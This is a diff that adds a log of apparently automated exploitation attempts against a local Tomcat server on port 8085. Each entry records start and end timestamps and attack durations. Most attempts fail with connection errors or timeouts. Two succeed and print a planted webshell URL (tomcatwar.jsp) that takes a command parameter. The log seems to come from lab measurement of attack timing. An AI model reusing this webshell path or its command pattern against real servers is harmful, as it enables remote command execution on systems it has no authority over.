@@ -1,0 +1,110 @@
+N1: 1688688481349527761
+2023-07-06 19:08:01.349503
+[x] Exploiting http://127.0.0.1:8085
+[-] Exploitation failed
+HTTPConnectionPool(host='127.0.0.1', port=8085): Max retries exceeded with url: / (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f27a367b790>: Failed to establish a new connection: [Errno 111] Connection refused'))
+N2: 1688688481349527761
+2023-07-06 19:08:01.352202
+0:00:00.002699
+0:00:00.002699
+TIME FOR ATTACK N2-n1: 2676598
+N1: 1688688541504753308
+2023-07-06 19:09:01.504728
+[x] Exploiting http://127.0.0.1:8085
+[-] Exploitation failed
+HTTPConnectionPool(host='127.0.0.1', port=8085): Max retries exceeded with url: / (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f058e108790>: Failed to establish a new connection: [Errno 111] Connection refused'))
+N2: 1688688541504753308
+2023-07-06 19:09:01.507385
+0:00:00.002657
+0:00:00.002657
+TIME FOR ATTACK N2-n1: 2634056
+N1: 1688688721456273431
+2023-07-06 19:12:01.456245
+[x] Exploiting http://127.0.0.1:8085
+[*] Exploitation successful!
+[*] Webshell URL: http://127.0.0.1:8085/tomcatwar.jsp?pwd=j&cmd=whoami
+N2: 1688688721456273431
+2023-07-06 19:12:05.810291
+0:00:04.354046
+0:00:04.354046
+TIME FOR ATTACK N2-n1: 4354024154
+N1: 1688688721460296767
+2023-07-06 19:12:01.460272
+[x] Exploiting http://127.0.0.1:8085
+[*] Exploitation successful!
+[*] Webshell URL: http://127.0.0.1:8085/tomcatwar.jsp?pwd=j&cmd=whoami
+N2: 1688688721460296767
+2023-07-06 19:12:05.815429
+0:00:04.355157
+0:00:04.355157
+TIME FOR ATTACK N2-n1: 4355140001
+N1: 1688688842271988819
+2023-07-06 19:14:02.271929
+[x] Exploiting http://127.0.0.1:8085
+[-] Exploitation failed
+HTTPConnectionPool(host='127.0.0.1', port=8085): Read timed out. (read timeout=15)
+N2: 1688688842271988819
+2023-07-06 19:14:17.339639
+0:00:15.067710
+0:00:15.067710
+TIME FOR ATTACK N2-n1: 15067658276
+N1: 1688688902318016304
+2023-07-06 19:15:02.317953
+[x] Exploiting http://127.0.0.1:8085
+[-] Exploitation failed
+HTTPConnectionPool(host='127.0.0.1', port=8085): Read timed out. (read timeout=15)
+N2: 1688688902318016304
+2023-07-06 19:15:17.372899
+0:00:15.054946
+0:00:15.054946
+TIME FOR ATTACK N2-n1: 15054896782
+N1: 1688688961513967728
+2023-07-06 19:16:01.513940
+[x] Exploiting http://127.0.0.1:8085
+[-] Exploitation failed
+HTTPConnectionPool(host='127.0.0.1', port=8085): Read timed out. (read timeout=15)
+N2: 1688688961513967728
+2023-07-06 19:16:16.535717
+0:00:15.021777
+0:00:15.021777
+TIME FOR ATTACK N2-n1: 15021756553
+N1: 1688689082907116155
+2023-07-06 19:18:02.907007
+[x] Exploiting http://127.0.0.1:8085
+[-] Exploitation failed
+HTTPConnectionPool(host='127.0.0.1', port=8085): Read timed out. (read timeout=15)
+N2: 1688689082907116155
+2023-07-06 19:18:17.940190
+0:00:15.033183
+0:00:15.033183
+TIME FOR ATTACK N2-n1: 15033081780
+N1: 1688689082901157138
+2023-07-06 19:18:02.901095
+[x] Exploiting http://127.0.0.1:8085
+[-] Exploitation failed
+HTTPConnectionPool(host='127.0.0.1', port=8085): Read timed out. (read timeout=15)
+N2: 1688689082901157138
+2023-07-06 19:18:17.943646
+0:00:15.042551
+0:00:15.042551
+TIME FOR ATTACK N2-n1: 15042495242
+N1: 1688689201631003101
+2023-07-06 19:20:01.630969
+[x] Exploiting http://127.0.0.1:8085
+[-] Exploitation failed
+HTTPConnectionPool(host='127.0.0.1', port=8085): Read timed out. (read timeout=15)
+N2: 1688689201631003101
+2023-07-06 19:20:16.663440
+0:00:15.032471
+0:00:15.032471
+TIME FOR ATTACK N2-n1: 15032444241
+N1: 1688689261381337587
+2023-07-06 19:21:01.381295
+[x] Exploiting http://127.0.0.1:8085
+[-] Exploitation failed
+HTTPConnectionPool(host='127.0.0.1', port=8085): Max retries exceeded with url: / (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f0cca059790>: Failed to establish a new connection: [Errno 111] Connection refused'))
+N2: 1688689261381337587
+2023-07-06 19:21:01.386904
+0:00:00.005609
+0:00:00.005609
+TIME FOR ATTACK N2-n1: 5573047
